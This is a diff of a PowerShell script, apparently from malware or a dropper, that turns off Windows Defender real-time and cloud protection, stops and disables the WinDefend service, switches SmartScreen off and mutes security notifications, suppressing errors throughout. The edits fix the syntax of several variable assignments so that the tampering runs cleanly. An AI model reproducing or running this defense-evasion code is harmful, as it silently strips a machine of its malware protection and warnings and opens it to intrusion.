@@ -2,9 +2,9 @@ Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Secur
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -ErrorAction SilentlyContinue;
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue;
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -ErrorAction SilentlyContinue;
-$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" -ErrorAction SilentlyContinue;
-$propertyName = "Enabled" -ErrorAction SilentlyContinue;
-$desiredValue = 0 -ErrorAction SilentlyContinue;
+$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance";
+$propertyName = "Enabled";
+$desiredValue = 0;
 if (-not (Test-Path $regPath)) {
     New-Item -Path $regPath -Force | Out-Null
 };
@@ -33,8 +33,8 @@ Set-MpPreference -PUAProtection 0 -ErrorAction SilentlyContinue;
 Set-MpPreference -DisableCloudProtection $true -ErrorAction SilentlyContinue;
 Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue;
 Set-Service -Name WinDefend -StartupType Disabled -ErrorAction SilentlyContinue;
-$regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -ErrorAction SilentlyContinue;
-$propertyName = "SmartScreenEnabled" -ErrorAction SilentlyContinue;
+$regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer";
+$propertyName = "SmartScreenEnabled";
 $desiredValue = "Off" -ErrorAction SilentlyContinue;
 if (-not (Test-Path $regPath)) {
     New-Item -Path $regPath -Force | Out-Null
